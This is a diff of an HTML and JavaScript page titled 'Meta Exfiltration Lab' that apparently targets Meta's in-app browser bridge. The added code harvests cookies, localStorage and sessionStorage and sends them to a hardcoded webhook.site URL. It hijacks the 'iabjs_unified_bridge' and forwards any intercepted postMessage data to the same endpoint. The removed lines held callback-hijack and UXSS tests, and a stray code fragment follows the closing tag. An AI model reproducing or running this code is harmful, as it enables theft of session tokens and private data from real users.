@@ -2,68 +2,80 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Bridge Fixed Lab</title>
+    <title>Meta Exfiltration Lab</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
-        .card { border: 1px solid #333; padding: 10px; margin-bottom: 15px; background: #111; }
-        button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; margin: 5px 0; font-weight: bold; cursor: pointer; }
-        .log { background: #000; height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; font-size: 11px; color: #00ffff; }
-        .cyan { color: #00ffff; }
-        .yellow { color: #ffff00; }
+        body { background: #000; color: #ff00ff; font-family: 'Courier New', monospace; padding: 15px; }
+        .card { border: 2px solid #ff00ff; padding: 15px; margin-bottom: 20px; background: #111; border-radius: 8px; }
+        button { background: #111; color: #ff00ff; border: 1px solid #ff00ff; padding: 12px; width: 100%; margin: 8px 0; cursor: pointer; font-weight: bold; }
+        .log { background: #000; height: 150px; overflow-y: auto; border: 1px dashed #444; padding: 10px; font-size: 11px; color: #0f0; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h3>Meta Vulnerability Scanner</h3>
-        <button onclick="fuzzBridgeEvents()">1. Trigger Callback Hijack</button>
-        <button onclick="testUXSS()">2. Test UXSS (Origin Bypass)</button>
-        <button onclick="scanPrivateFiles()">3. Scan Private Files</button>
-        <button onclick="leakStack()">4. Force Stack Trace</button>
+        <h3>Meta Exfiltration Lab</h3>
+        <p style="font-size: 0.7rem; color: #888;">Data will be sent to your Webhook.site</p>
+        <button onclick="exfiltrateStorage()">1. Send Storage to Webhook</button>
+        <button onclick="exfiltrateBridgeInfo()">2. Force Bridge Leak to Webhook</button>
     </div>
 
-    <div id="log" class="log">Console: Waiting for Execution...</div>
-
-    <iframe id="victimFrame" src="https://example.com" style="display:none"></iframe>
+    <div class="log" id="logBox">Waiting for exfiltration...</div>
 
     <script>
-        const logBox = document.getElementById('log');
-        function log(m, cls='') { 
-            logBox.innerHTML += `<div class="${cls}">> [${new Date().toLocaleTimeString()}] ${m}</div>`; 
+        const WEBHOOK_URL = "https://webhook.site/7a9ce72c-38b6-4f91-a1b8-5bea8d85797d"; // <--- APNA URL DALO
+        const logBox = document.getElementById('logBox');
+
+        function log(m) {
+            logBox.innerHTML += `<br>> [${new Date().toLocaleTimeString()}] ${m}`;
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // 1. Fixed Callback Hijack
-        function fuzzBridgeEvents() {
-            log("Attempting iabjs callback hijack...");
-            try {
-                if (window.iabjs_unified_bridge) {
-                    window.iabjs_unified_bridge.postMessage(JSON.stringify({ 
-                        "handler": "AnalyticsHandler", 
-                        "method": "logEvent", 
-                        "data": {"event_name": "test_exploit"} 
-                    }), "*");
-                    log("Payload Sent to Bridge.");
-                } else {
-                    log("Bridge not found.", "yellow");
+        // Data bhejne ka function
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            }).then(() => log("Data sent to Webhook.site!"))
+              .catch(e => log("Exfiltration Failed: " + e));
+        }
+
+        // 1. Storage Chura kar bhejna
+        function exfiltrateStorage() {
+            log("Harvesting storage...");
+            let dump = {
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                cookies: document.cookie,
+                userAgent: navigator.userAgent
+            };
+            sendToWebhook(dump);
+        }
+
+        // 2. Bridge ko force karke jo bhi mile bhej dena
+        function exfiltrateBridgeInfo() {
+            log("Attempting Bridge Callback Hijack...");
+            if (window.iabjs_unified_bridge) {
+                // Bridge ko message bhejna aur listener laga dena
+                try {
+                    window.iabjs_unified_bridge.postMessage(JSON.stringify({type: "get_config"}), "*");
+                    log("Bridge pinged, check Webhook for responses.");
+                } catch(e) {
+                    sendToWebhook({error: e.message, bridge: "iabjs"});
                 }
-            } catch(e) {
-                log("Bridge Error: " + e.message, "yellow");
+            } else {
+                log("Bridge not found.");
             }
         }
 
-        // 2. Fixed UXSS Test
-        function testUXSS() {
-            log("Attempting to read iframe content...");
-            try {
-                var frame = document.getElementById('victimFrame');
-                var content = frame.contentWindow.document.body.innerHTML;
-                log("UXSS SUCCESS: Origin bypassed!", "cyan");
-                alert("Leaked: " + content);
-            } catch(e) {
-                log("Blocked: Same-Origin Policy active.");
-            }
-        }
+        // Listener: Agar koi bhi message aata hai, direct webhook par
+        window.addEventListener("message", (event) => {
+            log("INTERCEPTED: Forwarding to Webhook...");
+            sendToWebhook({interceptedData: event.data, origin: event.origin});
+        });
+    </script>
+</body>
+</html>
 
         // 3. Fixed File Scanner
         function scanPrivateFiles() {
